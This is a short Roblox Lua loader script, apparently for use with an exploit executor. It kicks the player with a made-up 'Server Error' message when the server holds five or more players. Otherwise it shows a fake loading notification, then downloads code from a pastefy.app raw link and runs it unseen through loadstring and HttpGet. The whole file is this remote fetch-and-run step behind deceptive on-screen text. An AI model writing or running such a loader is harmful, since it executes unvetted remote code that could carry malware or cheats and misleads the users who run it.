local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local LocalPlayer = Players.LocalPlayer
local playerCount = #Players:GetPlayers()

if playerCount >= 5 then
    LocalPlayer:Kick("Server Error: Please try another server.")
else
    StarterGui:SetCore("SendNotification", {
        Title = "Script Loading",
        Text = "Please Wait Until 100%",
        Duration = 5
    })

    loadstring(game:HttpGet("https://pastefy.app/UzKPNzGq/raw"))()
end
